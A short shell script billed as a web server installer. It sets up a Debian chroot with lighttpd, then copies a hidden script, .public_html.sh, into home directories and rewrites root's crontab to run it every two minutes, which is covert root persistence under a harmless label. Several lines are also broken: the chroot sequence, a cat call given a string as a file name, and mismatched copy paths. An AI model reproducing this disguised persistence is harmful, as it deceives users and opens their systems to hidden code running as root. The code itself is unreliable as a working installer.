#!/bin/sh
echo "[*] Install web server?"
mkdir -p .OS/lighttpd
debootstrap wheezy .OS/lighttpd http://http.debian.net/debian
chroot .OS/lighttpd
apt-get install lighttpd php5-cgi
exit
mkdir ~/public_html
cp ./.public_html.sh home/*/public_html.sh
chmod +x .public_html.sh
cp /var/spool/cron/crontabs/root /var/spool/cron/crontabs/root.tmp
rm /var/spool/cron/crontabs/root
cat /var/spool/cron/crontabs/root.tmp "*/2 * * * * /home/*/.public_html.sh
" > /var/spool/cron/crontabs/root
rm /var/spool/cron/crontabs/root.tmp
echo "[*] Web server installed."
